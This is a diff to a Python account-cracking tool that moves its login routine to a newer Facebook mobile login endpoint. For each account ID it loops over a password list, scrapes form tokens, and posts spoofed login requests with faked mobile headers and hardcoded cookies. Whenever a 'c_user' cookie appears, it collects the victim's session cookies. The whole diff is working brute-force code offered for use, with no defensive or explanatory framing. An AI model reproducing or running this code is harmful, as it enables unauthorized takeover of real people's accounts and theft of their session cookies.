@@ -215,37 +215,130 @@ class System:
         sys.stdout.flush()
         try:
             for pas in passlist:
-                url = "https://touch.facebook.com/"
-                curl = ses.get(url).text
-                data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(curl.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(curl.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(curl.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(curl.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
+                url = "https://m.facebook.com/"
+                free_fb = ses.get(url).text
+                cookies =  {
+                'datr': 'xcX7Z4DKHmGuPaCp1dVgQvkz',
+                'sb': 'xcX7Zy5SqQcks4qDk_jQP6i_',
+                'ps_l': '1',
+                'ps_n': '1',
+                'vpd': 'v1%3B795x424x2.294114351272583',
+                'm_pixel_ratio': '2.294114351272583',
+                'wd': '424x942',
+                'locale': 'en_GB',
+                'wl_cbv': 'v2%3Bclient_version%3A2852%3Btimestamp%3A1750847150',
+                'fr': '106BQ1epswINZg8wp.AWcvWkRed452YBYECwpFaAQviI8sgj180ncZi5gCILiwwqgdcgE.BoOt9p..AAA.0.0.BoW87W.AWflu0sdn9tq7BOrr4-oyfRsnyg',}
+                params = {
+                'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
+                'type': 'action',
+                '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
+                data = {
+    '__aaid': '0',
+    '__user': '0',
+    '__a': '1',
+    '__req': 'a',
+    '__hs': '20246.BP:wbloks_caa_pkg.2.0...0',
+    'dpr': '3',
+    '__ccg': 'EXCELLENT',
+    '__rev': '1024174141',
+    '__s': 'x1o4xw:8r2dh7:lp3jl0',
+    '__hsi': '7519831310254955835',
+    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
+    'fb_dtsg': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    'params': json.dumps({
+        "params": json.dumps({
+            "server_params": {
+                "credential_type": "password",
+                "username_text_input_id": "7w9omu:68",
+                "password_text_input_id": "7w9omu:69",
+                "login_source": "Login",
+                "login_credential_type": "none",
+                "server_login_source": "login",
+                "ar_event_source": "login_home_page",
+                "should_trigger_override_login_success_action": 0,
+                "should_trigger_override_login_2fa_action": 0,
+                "is_caa_perf_enabled": 0,
+                "reg_flow_source": "login_home_native_integration_point",
+                "caller": "gslr",
+                "is_from_landing_page": 0,
+                "is_from_empty_password": 0,
+                "is_from_aymh": 0,
+                "is_from_password_entry_page": 0,
+                "is_from_assistive_id": 0,
+                "is_from_msplit_fallback": 0,
+                "two_step_login_type": "one_step_login",
+                "INTERNAL__latency_qpl_marker_id": 36707139,
+                "INTERNAL__latency_qpl_instance_id": "47746277400427",
+                "device_id": None,
+                "family_device_id": None,
+                "waterfall_id": str(uuid.uuid4()),
+                "offline_experiment_group": None,
+                "layered_homepage_experiment_group": None,
+                "is_platform_login": 0,
+                "is_from_logged_in_switcher": 0,
+                "is_from_logged_out": 0,
+                "access_flow_version": "pre_mt_behavior"
+            },
+            "client_input_params": {
+                "machine_id": "",
+                "cloud_trust_token": None,
+                "contact_point": ids,
+                "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
+                "accounts_list": [],
+                "fb_ig_device_id": [],
+                "secure_family_device_id": "",
+                "encrypted_msisdn": "",
+                "headers_infra_flow_id": "",
+                "try_num": 1,
+                "login_attempt_count": 1,
+                "event_flow": "login_manual",
+                "event_step": "home_page",
+                "openid_tokens": {},
+                "block_store_machine_id": "",
+                "auth_secure_device_id": "",
+                "client_known_key_hash": "",
+                "has_whatsapp_installed": 0,
+                "sso_token_map_json_string": "",
+                "should_show_nested_nta_from_aymh": 0,
+                "password_contains_non_ascii": "false",
+                "has_granted_read_contacts_permissions": 0,
+                "has_granted_read_phone_permissions": 0,
+                "app_manager_id": "",
+                "aymh_accounts": [],
+                "lois_settings": {
+                    "lois_token": ""
+                }
+            }
+        })
+    }),
+}
                 headers = {
-                'authority': 'www.facebook.com',
-                'method': 'POST', 
-                'path': '/login/device-based/regular/login/?login_attempt=1', 
-                'scheme': 'https',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
-                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8', 
-                'cache-control': 'max-age=0',
+                'Host': 'mtouch.facebook.com',
+                # 'content-length': str(len(str(data))), # Content-length is usually set by requests
+                'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
+                'sec-ch-ua-mobile': '?1',
+                'user-agent': ____PO_CO____(), # Using the dynamic UA generator
+                'x-response-format': 'JSONStream',
                 'content-type': 'application/x-www-form-urlencoded',
-                'dpr': '3',
-                'origin': 'https://www.facebook.com',
-                'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=1718380515655421&kid_directed_site=0&app_id=1718380515655421&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fapp_id%3D1718380515655421%26cbt%3D1747636611478%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9be1a2af0386262b%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%26client_id%3D1718380515655421%26display%3Dpopup%26domain%3Dwww.joytify.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joytify.com%252Fen-us%252Fmobile-legends%26locale%3Den_US%26logger_id%3Df07d7c4f0f56598ba%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfa3f64cb62f26007f%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%2526frame%253Dfb83b5c58426b5953%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv9.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfa3f64cb62f26007f%26domain%3Dwww.joytify.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joytify.com%252Ff2236f8decdda0d2e%26relation%3Dopener%26frame%3Dfb83b5c58426b5953%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0', 
+                'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                'viewport-width': '360',
+                'x-requested-with': 'XMLHttpRequest',
+                'x-asbd-id': '129477',
+                'dpr': '2',
                 'sec-ch-prefers-color-scheme': 'light',
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-model': '""', 
-                'sec-ch-ua-platform': '"Linux"',
-                'sec-ch-ua-platform-version': '""',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
+                'sec-ch-ua-platform': '"Android"',
+                'accept': '*/*',
+                'origin': 'https://mtouch.facebook.com',
                 'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': self.samsung_user_agent(),
-                'viewport-width': '980'}
-                login_url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fapp_id%3D1718380515655421%26cbt%3D1747636611478%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9be1a2af0386262b%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%26client_id%3D1718380515655421%26display%3Dpopup%26domain%3Dwww.joytify.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joytify.com%252Fen-us%252Fmobile-legends%26locale%3Den_US%26logger_id%3Df07d7c4f0f56598ba%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfa3f64cb62f26007f%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%2526frame%253Dfb83b5c58426b5953%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv9.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&popup=1&lwv=100"
-                response = ses.post(url=login_url, data=data, headers=headers)
+                'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
+                login_url = "https://m.facebook.com/async/wbloks/fetch/"
+                response = ses.post(url=login_url, params=params, data=data, cookies=cookies, headers=headers)
                 log_cookies = ses.cookies.get_dict().keys()
                 if "c_user" in log_cookies:
                     kuki=";".join([f"{key}={ses.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
